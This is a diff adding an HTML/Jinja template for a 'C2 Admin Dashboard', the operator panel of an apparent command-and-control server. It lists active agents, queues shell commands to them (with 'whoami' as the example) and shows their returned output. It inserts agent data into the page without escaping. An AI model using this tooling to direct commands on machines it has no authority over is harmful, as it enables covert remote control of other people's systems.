@@ -1,0 +1,169 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>C2 Admin Dashboard</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+    <style>
+        body { font-family: Inter, system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial, sans-serif; margin: 0; background: #0b1220; color: #e5e7eb; }
+        .wrap { max-width: 1100px; margin: 0 auto; padding: 24px; }
+        .card { background: #0f172a; border: 1px solid #1f2a44; border-radius: 10px; padding: 18px; }
+        h1 { font-size: 22px; margin: 0 0 16px; }
+        h2 { font-size: 16px; margin: 0 0 10px; color: #cbd5e1; }
+        label { display: block; font-size: 13px; color: #9ca3af; margin-bottom: 4px; }
+        input, textarea, select { width: 100%; background: #0b1020; color: #e5e7eb; border: 1px solid #273148; border-radius: 8px; padding: 10px 12px; }
+        textarea { min-height: 80px; resize: vertical; }
+        .row { display: grid; grid-template-columns: 1fr 2fr auto; gap: 12px; align-items: end; }
+        .btn { background: #2563eb; color: white; border: none; padding: 10px 14px; border-radius: 8px; cursor: pointer; }
+        .btn:hover { background: #1d4ed8; }
+        .grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 16px; margin-top: 16px; }
+        .list { list-style: none; padding: 0; margin: 0; }
+        .item { padding: 10px 0; border-bottom: 1px solid #212b44; }
+        .meta { color: #93a3bd; font-size: 12px; }
+        .flash { padding: 10px 12px; border: 1px solid #2a3758; background: #0e172a; border-radius: 8px; margin-bottom: 12px; }
+    </style>
+    <script>
+        function fillAgent(agentId) {
+            document.getElementById('agent_id').value = agentId;
+        }
+
+        async function fetchSnapshot() {
+            const res = await fetch('{{ url_for('admin_data') }}', {cache: 'no-cache'});
+            return await res.json();
+        }
+
+        function renderDashboard(data) {
+            // Active agents
+            const activeList = document.querySelector('#active_agents');
+            activeList.innerHTML = '';
+            if (data.active_agents.length === 0) {
+                const li = document.createElement('li');
+                li.className = 'item meta';
+                li.textContent = 'No active agents in last minute.';
+                activeList.appendChild(li);
+            } else {
+                data.active_agents.forEach(a => {
+                    const li = document.createElement('li');
+                    li.className = 'item';
+                    li.innerHTML = `<div><strong>${a.id}</strong></div>
+                        <div class="meta">last seen ${a.seconds_ago}s ago</div>
+                        <div class="meta"><a href="#" onclick="fillAgent('${a.id}'); return false;" style="color:#60a5fa; text-decoration:none;">send task</a></div>`;
+                    activeList.appendChild(li);
+                });
+            }
+
+            // Tasks
+            const tasksList = document.querySelector('#tasks');
+            tasksList.innerHTML = '';
+            const tasksKeys = Object.keys(data.tasks);
+            if (tasksKeys.length === 0) {
+                const li = document.createElement('li');
+                li.className = 'item meta';
+                li.textContent = 'No tasks queued.';
+                tasksList.appendChild(li);
+            } else {
+                tasksKeys.forEach(a => {
+                    const li = document.createElement('li');
+                    li.className = 'item';
+                    li.innerHTML = `<strong>${a}</strong> <span class="meta">→</span> ${data.tasks[a]}`;
+                    tasksList.appendChild(li);
+                });
+            }
+
+            // Responses
+            const respList = document.querySelector('#responses');
+            respList.innerHTML = '';
+            const respKeys = Object.keys(data.responses);
+            if (respKeys.length === 0) {
+                const li = document.createElement('li');
+                li.className = 'item meta';
+                li.textContent = 'No responses yet.';
+                respList.appendChild(li);
+            } else {
+                respKeys.forEach(a => {
+                    const li = document.createElement('li');
+                    li.className = 'item';
+                    li.innerHTML = `<div><strong>${a}</strong></div>
+                        <pre style="white-space: pre-wrap; background:#0b1020; border:1px solid #273148; padding:10px; border-radius:8px;">${data.responses[a]}</pre>
+                        <div class="meta"><a href="${'{{ url_for('view', agent_id='__ID__') }}'.replace('__ID__', a)}" style="color:#60a5fa; text-decoration:none;">open raw</a> · <a href="#" onclick="fillAgent('${a}'); return false;" style="color:#60a5fa; text-decoration:none;">send new task</a></div>`;
+                    respList.appendChild(li);
+                });
+            }
+        }
+
+        function startLiveUpdates() {
+            const es = new EventSource('{{ url_for('admin_stream') }}');
+            es.onmessage = async () => {
+                try {
+                    const data = await fetchSnapshot();
+                    renderDashboard(data);
+                } catch (e) {}
+            };
+            es.onerror = () => {
+                // If the connection drops, retry later
+                setTimeout(() => { es.close(); startLiveUpdates(); }, 3000);
+            };
+        }
+
+        window.addEventListener('DOMContentLoaded', async () => {
+            try {
+                const data = await fetchSnapshot();
+                renderDashboard(data);
+            } catch (e) {}
+            startLiveUpdates();
+        });
+    </script>
+    </head>
+<body>
+    <div class="wrap">
+        <div class="card">
+            <h1>C2 Admin Dashboard</h1>
+
+            {% with messages = get_flashed_messages(with_categories=true) %}
+            {% if messages %}
+                {% for category, message in messages %}
+                    <div class="flash">{{ message }}</div>
+                {% endfor %}
+            {% endif %}
+            {% endwith %}
+
+            <form class="row" method="post" action="{{ url_for('admin_send') }}">
+                <div>
+                    <label for="agent_id">Agent</label>
+                    <input id="agent_id" name="agent_id" placeholder="e.g., agent01" list="agent_list" />
+                    <datalist id="agent_list">
+                        {% for a in agents %}<option value="{{ a }}">{{ a }}</option>{% endfor %}
+                    </datalist>
+                </div>
+                <div>
+                    <label for="cmd">Command</label>
+                    <input id="cmd" name="cmd" placeholder="whoami" />
+                </div>
+                <div>
+                    <button class="btn" type="submit">Queue Task</button>
+                </div>
+            </form>
+
+            <div class="grid">
+                <div>
+                    <h2>Active Agents (≤60s)</h2>
+                    <ul id="active_agents" class="list"></ul>
+                </div>
+                <div>
+                    <h2>Queued Tasks</h2>
+                    <ul id="tasks" class="list"></ul>
+                </div>
+                <div>
+                    <h2>Latest Responses</h2>
+                    <ul id="responses" class="list"></ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
+
+
